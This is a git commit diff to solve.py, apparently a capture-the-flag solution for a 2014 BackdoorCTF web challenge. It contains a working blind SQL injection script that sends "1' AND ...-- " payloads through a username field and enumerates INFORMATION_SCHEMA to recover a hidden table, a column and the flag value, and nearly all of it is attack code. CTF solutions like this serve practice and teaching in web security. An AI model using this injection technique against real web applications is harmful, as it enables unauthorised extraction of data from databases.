4d9b62b7a88b8a9ea2a3321ed15abafbcd775750
ShySec <github@shysecurity.com>
2014-07-05 12:51:45 -0400

    Update solve.py

--- 2014/BackdoorCTF/web2_300/solve.py
+++ 2014/BackdoorCTF/web2_300/solve.py
@@ -3,7 +3,6 @@ import requests
 def get(username):
 	r=requests.get('http://backdoor.cognizance.org.in/problems/web300/status.php') # get cookie
 	r=requests.post('http://backdoor.cognizance.org.in/problems/web300/check.php',data=dict(username=username),cookies=r.cookies)
-	print username, r.content
 	if r.content == 'Please wait for a little while for this user to be validated': return False
 	if r.content == 'This user has been validated': return True
 	if not r.content: return False # error
@@ -11,9 +10,6 @@ def get(username):
 
 def inject(sql):
 	return get("1' AND "+sql+'-- ') # escaped
-
-def tinject(queue, key, username):
-	queue.put((key,'1' if inject(username) else '0'))
 
 def enumByte(base,byte):
 	rval = ''
@@ -45,20 +41,26 @@ def getLength(query,minlen=0,maxlen=256):
 	return minlen
 
 #p=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%%flag' AND LENGTH(TABLE_NAME) BETWEEN %d AND %d)")
-p=16
+tlen=16
+print 'len(table_name) =',tlen
 
 #r=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%%flag' AND %s)","TABLE_NAME",tlen)
-r='the_elusive_flag'
+t='the_elusive_flag'
+print 'table_name =',t
 
 #p=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND LENGTH(COLUMN_NAME) BETWEEN %d AND %d)")
-p=24
+clen=24
+print 'len(%s.column_name) = %d'%(t,clen)
 
-#r=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND %s)","COLUMN_NAME",p)
-r='this_column_has_the_flag'
+
+#r=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND %s)","COLUMN_NAME",clen)
+c='this_column_has_the_flag'
+print '%s.column_name = %s'%(t,c)
 
 #p=getLength("(SELECT LENGTH(this_column_has_the_flag) BETWEEN %d and %d FROM the_elusive_flag")
-p=256
+dlen=256
+print 'len(%s.%s[0]) = %d'%(t,c,dlen)
 
-#r=enumString("(SELECT %s FROM the_elusive_flag)","this_column_has_the_flag",p)
+#r=enumString("(SELECT %s FROM the_elusive_flag)","this_column_has_the_flag",dlen)
 r='9d4dcc5981b17bf37740c7dbabe3b294'
-print 'value',r
+print 'flag',r
